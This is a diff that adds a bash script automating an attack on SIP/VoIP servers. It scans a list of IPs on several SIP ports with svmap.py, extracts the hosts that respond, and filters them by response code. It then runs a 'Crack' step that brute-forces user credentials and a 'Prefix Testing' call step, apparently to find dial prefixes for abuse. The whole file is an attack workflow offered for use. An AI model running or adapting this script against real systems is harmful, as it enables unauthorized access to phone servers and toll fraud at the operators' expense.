@@ -1,0 +1,77 @@
+#!/bin/bash
+
+# Scan IPv4 range on port sip
+
+echo -e "\nStart nslookup ...\n"
+
+while read -r ip; do
+	echo "Checking $ip";
+	python svmap.py $ip -p5060 -v -t0.0 >> output1.txt
+    python svmap.py $ip -p6060 -v -t0.0 >> output2.txt
+    python svmap.py $ip -p6069 -v -t0.0 >> output3.txt
+    python svmap.py $ip -p5061 -v -t0.0 >> output4.txt
+    python svmap.py $ip -p6080 -v -t0.0 >> output5.txt
+    python svmap.py $ip -p5080 -v -t0.0 >> output6.txt
+
+cat output1.txt output2.txt output3.txt output4.txt output5.txt output6.txt >> output
+
+
+done < ip.txt
+
+echo "we scaned Everythings"
+sleep 1
+
+echo -e "\nEnding scanning nslookup !\n"
+
+# IP Extractor
+
+echo -e "\nStart IP Extractor ...\n"
+
+grep -Po "(\d+\.){3}\d+:?(\d?){7}" output >>cn1
+grep -R ':' cn1 >cn2
+awk '!a[$0]++' cn2 >IPS
+sleep 1
+rm output1.txt
+rm output2.txt
+rm output3.txt
+rm output4.txt
+rm output5.txt
+rm output6.txt
+rm cn1
+rm cn2
+rm cn1
+sleep 1
+
+echo -e "\nEnding IP Extractor !\n"
+
+# SIP responses
+
+echo -e "\nStart SIP responses ...\n"
+
+perl run IPS
+cat 401.pal 403.pal 404.pal  >> IPss
+sleep 1
+
+echo -e "\nEnding SIP responses !\n"
+
+# SIP Crack user&password
+
+echo -e "\nStart SIP Crack ...\n"
+
+perl Crack 2000 2 IPss
+sleep 1
+
+echo -e "\nEnding SIP Crack !\n"
+
+# Prefix Testing Call
+
+echo -e "\nStart Prefix Testing ...\n"
+
+perl call VOIPresult 500 20 | tee callfile
+cat callfile | awk '{print $2 ":" $3 ":" $4 ":" $5 ":" $6}' > CallGood.txt
+sudo rm callfile
+sleep 5
+
+echo -e "\nEnding Prefix Testing !\n"
+
+echo -e "\nby Mohammad Elnwajha\n"
